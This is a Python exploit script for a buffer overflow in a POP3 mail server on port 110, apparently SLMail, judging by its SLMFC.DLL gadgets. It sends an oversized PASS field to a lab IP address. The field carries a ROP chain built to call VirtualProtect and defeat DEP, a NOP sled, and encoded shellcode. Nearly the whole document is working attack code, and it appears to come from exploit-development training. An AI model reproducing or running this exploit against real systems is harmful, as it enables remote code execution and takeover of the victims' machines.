#!/usr/bin/python
import socket
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode =(
"\xba\xae\xa4\xaf\x1f\xd9\xea\xd9\x74\x24\xf4\x58\x33\xc9\xb1"+
"\x52\x83\xc0\x04\x31\x50\x0e\x03\xfe\xaa\x4d\xea\x02\x5a\x13"+
"\x15\xfa\x9b\x74\x9f\x1f\xaa\xb4\xfb\x54\x9d\x04\x8f\x38\x12"+
"\xee\xdd\xa8\xa1\x82\xc9\xdf\x02\x28\x2c\xee\x93\x01\x0c\x71"+
"\x10\x58\x41\x51\x29\x93\x94\x90\x6e\xce\x55\xc0\x27\x84\xc8"+
"\xf4\x4c\xd0\xd0\x7f\x1e\xf4\x50\x9c\xd7\xf7\x71\x33\x63\xae"+
"\x51\xb2\xa0\xda\xdb\xac\xa5\xe7\x92\x47\x1d\x93\x24\x81\x6f"+
"\x5c\x8a\xec\x5f\xaf\xd2\x29\x67\x50\xa1\x43\x9b\xed\xb2\x90"+
"\xe1\x29\x36\x02\x41\xb9\xe0\xee\x73\x6e\x76\x65\x7f\xdb\xfc"+
"\x21\x9c\xda\xd1\x5a\x98\x57\xd4\x8c\x28\x23\xf3\x08\x70\xf7"+
"\x9a\x09\xdc\x56\xa2\x49\xbf\x07\x06\x02\x52\x53\x3b\x49\x3b"+
"\x90\x76\x71\xbb\xbe\x01\x02\x89\x61\xba\x8c\xa1\xea\x64\x4b"+
"\xc5\xc0\xd1\xc3\x38\xeb\x21\xca\xfe\xbf\x71\x64\xd6\xbf\x19"+
"\x74\xd7\x15\x8d\x24\x77\xc6\x6e\x94\x37\xb6\x06\xfe\xb7\xe9"+
"\x37\x01\x12\x82\xd2\xf8\xf5\x6d\x8a\x4a\x8e\x06\xc9\x4a\x8a"+
"\x04\x44\xac\xf8\xb8\x01\x67\x95\x21\x08\xf3\x04\xad\x86\x7e"+
"\x06\x25\x25\x7f\xc9\xce\x40\x93\xbe\x3e\x1f\xc9\x69\x40\xb5"+
"\x65\xf5\xd3\x52\x75\x70\xc8\xcc\x22\xd5\x3e\x05\xa6\xcb\x19"+
"\xbf\xd4\x11\xff\xf8\x5c\xce\x3c\x06\x5d\x83\x79\x2c\x4d\x5d"+
"\x81\x68\x39\x31\xd4\x26\x97\xf7\x8e\x88\x41\xae\x7d\x43\x05"+
"\x37\x4e\x54\x53\x38\x9b\x22\xbb\x89\x72\x73\xc4\x26\x13\x73"+
"\xbd\x5a\x83\x7c\x14\xdf\xb3\x36\x34\x76\x5c\x9f\xad\xca\x01"+
"\x20\x18\x08\x3c\xa3\xa8\xf1\xbb\xbb\xd9\xf4\x80\x7b\x32\x85"+
"\x99\xe9\x34\x3a\x99\x3b")


def create_rop_chain():

    # rop chain generated with mona.py
    rop_gadgets = [
    
    #[---INFO:gadgets_to_set_esi:---]
      0x5f4468b9,  # POP EDI # RETN [SLMFC.DLL] 
      0x5f49a2c0,  # ptr to &VirtualProtect() [IAT SLMFC.DLL]
      0x77808046,  # MOV ESI,DWORD PTR DS:[EDI] # RETN [ntdll.dll] ** REBASED ** ASLR 
    
    #[---INFO:gadgets_to_set_ebp:---]
      0x777f3892,  # POP EBP # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x7154fb51,  # & call esp [MSVCP60.dll] ** REBASED ** ASLR
    
      #[---INFO:gadgets_to_set_ebx:---]
      0x5f413e71,  # POP EAX # RETN [SLMFC.DLL] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x71401e67,  # NEG EAX # RETN [winrnr.dll] ** REBASED ** ASLR 
      0x7603bbc8,  # XCHG EAX,EBX # RETN [SHELL32.dll] ** REBASED ** ASLR 
    
      #[---INFO:gadgets_to_set_edx:---]
      0x7702a03d,  # POP EAX # RETN [ole32.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x77303193,  # NEG EAX # RETN [USER32.dll] ** REBASED ** ASLR 
      0x7710d586,  # XCHG EAX,EDX # RETN [comdlg32.dll] ** REBASED ** ASLR 
      
      #[---INFO:gadgets_to_set_ecx:---]
      0x779877ee,  # POP ECX # RETN [CLBCatQ.DLL] ** REBASED ** ASLR 
      0x772b8365,  # &Writable location [IMM32.DLL] ** REBASED ** ASLR
      
      #[---INFO:gadgets_to_set_edi:---]
      0x5f47f928,  # POP EDI # RETN [SLMFC.DLL] 
      0x75c76a92,  # RETN (ROP NOP) [SHLWAPI.dll] ** REBASED ** ASLR
      
      #[---INFO:gadgets_to_set_eax:---]
      0x75fa24a6,  # POP EAX # RETN [SHELL32.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      
      #[---INFO:pushad:---]
      0x778027c4,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain() 



#2606 for our offset, "\x8f\x35\x4a\x5f" for JMP ESP, enough NOPS to account for slack, shellcode, lastly our C's

# buffer = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90"*16 + shellcode + "C"*(3500-2606-4-351-16)

buffer = "A"*2606 + rop_chain + "\x90"*16 + shellcode


try:
	print "\nSending fuzzed buffer..."
	s.connect(('192.168.72.133',110))
	data = s.recv(1024)
	s.send('USER Anowar' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!,"
except:
	print "Could not connect"
